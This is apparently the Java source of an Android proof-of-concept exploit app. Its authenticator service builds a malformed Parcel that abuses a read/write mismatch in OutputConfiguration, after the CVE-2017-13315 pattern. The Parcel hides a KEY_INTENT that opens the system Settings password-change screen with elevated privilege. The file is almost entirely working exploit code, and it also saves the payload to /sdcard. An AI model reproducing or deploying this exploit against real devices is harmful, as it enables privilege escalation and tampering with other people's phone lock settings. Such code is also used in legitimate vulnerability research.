package com.cnzzh.cvepoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import java.io.FileOutputStream;
import java.util.ArrayList;

public class AuthService extends Service {
    static final String TAG = "AuthService";

    @Override
    public IBinder onBind(Intent intent) {
        return new Authenticator(this).getIBinder();
    }

    private static class Authenticator extends AbstractAccountAuthenticator {
        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
            Bundle evilBundle = new Bundle ();
            Parcel bndlData = Parcel.obtain();
            Parcel pcelData = Parcel.obtain();

            // Manipulate the raw data of bundle Parcel
            // Now we replace this right Parcel data to evil Parcel data
            pcelData.writeInt(3); // number of elements in ArrayMap
            /*****************************************/
            // mismatched object
            pcelData.writeString("mismatch");
            pcelData.writeInt(4); // VAL_PACELABLE
            pcelData.writeString("android.hardware.camera2.params.OutputConfiguration"); // name of Class Loader
            pcelData.writeInt(1);//mRotation
            pcelData.writeInt(1);//mSurfaceGrouId
            pcelData.writeInt(1);//mSurfaceType
            pcelData.writeInt(1);//mgetWidth
            pcelData.writeInt(1);//getHeight
            pcelData.writeInt(1);//mIsDeferredConfig
            //pcelData.writeInt(1);//mIsShared,由于read的时候少了mIsShared，这里直接不读这个字段，达到对齐的效果
            pcelData.writeTypedList (null);//mSurfaces

            /*
                直接模仿CVE-2017-13315,构造一个bytearray的键值对
            */
            pcelData.writeInt(1);
            pcelData.writeInt(6);
            pcelData.writeInt(13);
            //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
            pcelData.writeInt(-1); // dummy, will hold the length
            int keyIntentStartPos = pcelData.dataPosition();//获取Intent的初始位置

            // Evil object hide in PeriodicAdvertisingReport.mData
            pcelData.writeString(AccountManager.KEY_INTENT);
            pcelData.writeInt(4);
            pcelData.writeString("android.content.Intent");// name of Class Loader
            pcelData.writeString(Intent.ACTION_RUN); // Intent Action
            Uri.writeToParcel(pcelData, null); // Uri is null
            pcelData.writeString(null); // mType is null
            pcelData.writeInt(0x10000000); // Flags
            pcelData.writeString(null); // mPackage is null
            pcelData.writeString("com.android.settings");
            pcelData.writeString("com.android.settings.ChooseLockPassword");
            pcelData.writeInt(0); //mSourceBounds = null
            pcelData.writeInt(0); // mCategories = null
            pcelData.writeInt(0); // mSelector = null
            pcelData.writeInt(0); // mClipData = null
            pcelData.writeInt(-2); // mContentUserHint
            pcelData.writeBundle(null);

            int keyIntentEndPos = pcelData.dataPosition();//获取Intent的结束位置
            int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
            pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT
            pcelData.writeInt(lengthOfKeyIntent);
            pcelData.setDataPosition(keyIntentEndPos);
            Log.d(TAG, "Length of KEY_INTENT is " + Integer.toHexString(lengthOfKeyIntent));

            ///////////////////////////////////////
            pcelData.writeString("Padding-Key");
            pcelData.writeInt(0); // VAL_STRING
            pcelData.writeString("Padding-Value"); //


            int length  = pcelData.dataSize();
            Log.d(TAG, "length is " + Integer.toHexString(length));
            bndlData.writeInt(length);
            bndlData.writeInt(0x4c444E42);
            bndlData.appendFrom(pcelData, 0, length);
            bndlData.setDataPosition(0);
            evilBundle.readFromParcel(bndlData);
            Log.d(TAG, evilBundle.toString());
            byte[] raw = bndlData.marshall();
            try {
                FileOutputStream fos = new FileOutputStream ("/sdcard/obj.pcl");
                fos.write(raw);
                fos.close();
            } catch (Exception e){
                e.printStackTrace();
            }
            return evilBundle;
        }

        private Context m_context = null;
        Authenticator(Context context) {
            super(context);
            m_context = context;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
            return null;
        }
    }
}